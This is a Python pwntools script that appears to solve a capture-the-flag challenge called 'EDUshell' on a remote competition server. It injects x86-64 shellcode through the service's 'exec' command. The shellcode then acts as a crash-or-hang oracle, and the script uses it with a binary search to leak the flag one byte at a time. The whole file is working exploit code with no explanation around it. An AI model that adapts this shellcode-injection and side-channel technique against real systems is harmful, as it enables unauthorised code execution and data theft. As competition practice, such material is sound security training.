#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

timeout = 0.3
def check(offset, target):
    def loadflag():
        p.sendlineafter(b'SHELL $ ', b'loadflag')
    
    def _exec(payload):
        p.sendline(b'exec ' + payload)
    
    # p = process('./EDUshell')
    p = remote('eofqual.zoolab.org', 10101)
    # p = remote('172.20.0.1', 10101)
    
    loadflag()
    
    sleep(timeout)
    sc = asm('''
        mov rsi, rdx
        xor rdx, rdx
        xor rdi, rdi
        xor rax, rax
        mov dx, 0x1234
        syscall
    ''')
    
    _exec(sc)
    
    sleep(timeout)
    sc2 = asm('''
        mov rcx, rbx
        add rcx, ''' + str(offset) + '''
        mov al, BYTE PTR [rcx]
        cmp ax, ''' + str(target) + '''
        jb SAFE
        xor rax, rax
        inc rax
        syscall
    SAFE:
        mov rsi, rdx
        xor rdx, rdx
        xor rdi, rdi
        xor rax, rax
        mov dx, 0x1234
        syscall
    LOOP:
        nop
        nop
        nop
        jmp LOOP
    ''')

    try:
        # raw_input('>')
        p.sendline(sc + sc2)
        # raw_input('>')
        sleep(timeout)
        p.sendline(b'GG')
        p.recv(5, timeout=timeout)
    except EOFError:
        print('EOFerror except')
        return 0
    except:
        print('other except')
        return 0

    return 1

offset = 0x27c0
flag = b''

for i in range(80):
    r = 0x80
    l = 0x00
    t = r
    while l + 1 != r:
        if check(offset + i, t):
            r = t
        else:
            l = t
        t = (r + l) // 2
    flag += bytes([l])
    print(flag)
    if l == ord('}'):
        break

print(flag)

